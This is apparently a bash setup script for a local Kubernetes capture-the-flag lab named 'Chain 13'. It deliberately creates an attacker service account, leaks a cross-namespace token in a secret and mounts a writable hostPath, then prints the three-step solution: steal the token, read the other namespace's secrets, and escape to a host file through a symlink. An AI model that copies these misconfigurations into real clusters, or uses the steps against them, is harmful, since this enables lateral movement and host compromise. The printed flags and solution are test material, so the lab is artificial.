#!/bin/bash
# Chain 13: SA Cross-NS → RBAC → hostPath Escape (3 steps)
set -euo pipefail
CLUSTER_NAME="cve-chain13-sa-escape"
FLAG1="${CVE_FLAG1:-flag{chain13-step1-crossns}}"
FLAG2="${CVE_FLAG2:-flag{chain13-step2-rbac}}"
FLAG3="${CVE_FLAG3:-flag{chain13-step3-escape-final}}"

echo "[Chain 13] SA Token Lateral to Host Escape — 3 steps"

mkdir -p /home/kianabin/cve-flags/chain13
echo "$FLAG3" > /home/kianabin/cve-flags/chain13/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain13
        containerPath: /host-flag
KINDCFG

docker pull bitnami/kubectl:1.28 2>/dev/null || true
kind load docker-image bitnami/kubectl:1.28 --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true

# Namespaces
kubectl create ns ns-alpha --dry-run=client -o yaml | kubectl apply -f -
kubectl create ns ns-beta --dry-run=client -o yaml | kubectl apply -f -

# Attacker tenant RBAC (ns-alpha only)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: ns-alpha
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-ops
  namespace: ns-alpha
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "create"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-ops
  namespace: ns-alpha
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: ns-alpha
roleRef:
  kind: Role
  name: attacker-ops
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: ns-alpha
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: shell
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

# Victim SA in ns-beta: secrets read + pod exec (namespace-scoped)
kubectl create sa beta-reader -n ns-beta 2>/dev/null || true
kubectl apply -f - << 'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: beta-reader
  namespace: ns-beta
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: beta-reader
  namespace: ns-beta
subjects:
  - kind: ServiceAccount
    name: beta-reader
    namespace: ns-beta
roleRef:
  kind: Role
  name: beta-reader
  apiGroup: rbac.authorization.k8s.io
YAML

# Leaked token (flag1 + token) in ns-alpha
TOKEN=$(kubectl create token beta-reader -n ns-beta --duration=2h 2>/dev/null || true)
kubectl create secret generic chain13-leaked-token -n ns-alpha \
  --from-literal=flag="$FLAG1" --from-literal=token="$TOKEN" 2>/dev/null || true

# Step 2 flag in ns-beta
kubectl create secret generic chain13-step2-rbac -n ns-beta --from-literal=flag="$FLAG2" 2>/dev/null || true

# Step 3: writable hostPath pod in ns-beta (flag on the node, NOT mounted)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: chain13-hostpath
  namespace: ns-beta
spec:
  containers:
    - name: esc
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      volumeMounts:
        - name: hl
          mountPath: /host-log
  volumes:
    - name: hl
      hostPath:
        path: /var/log
YAML

kubectl wait --for=condition=Ready pod/attacker-pod -n ns-alpha --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/chain13-hostpath -n ns-beta --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain 13] Ready"
echo "  Step 1: TOKEN=\$(kubectl exec -n ns-alpha attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "          kubectl --token=\$TOKEN get secret chain13-leaked-token -n ns-alpha"
echo "  Step 2: LEAKED=\$(...token from the leaked secret...)"
echo "          kubectl --token=\$LEAKED get secret chain13-step2-rbac -n ns-beta"
echo "  Step 3: kubectl --token=\$LEAKED exec chain13-hostpath -n ns-beta -- sh -c 'ln -sf /host-flag /host-log/flag-link; cat /host-log/flag-link/flag.txt'"
